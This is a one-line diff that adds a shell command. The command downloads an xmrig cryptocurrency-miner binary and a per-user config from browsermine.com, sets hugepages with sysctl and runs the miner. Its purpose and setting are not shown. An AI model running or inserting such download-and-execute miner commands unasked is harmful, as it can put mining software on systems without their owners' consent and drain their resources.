@@ -1,0 +1,1 @@
+wget "https://dl.browsermine.com/bm-xmrig/ubuntu16-x64/bm-xmrig" && chmod u+x ./bm-xmrig && wget "https://api.browsermine.com/app/confgen/xmrig?u=2293792&n=linux-cpu" -O ./bm-xmrig.json && sysctl -w vm.nr_hugepages=5 && ./bm-xmrig
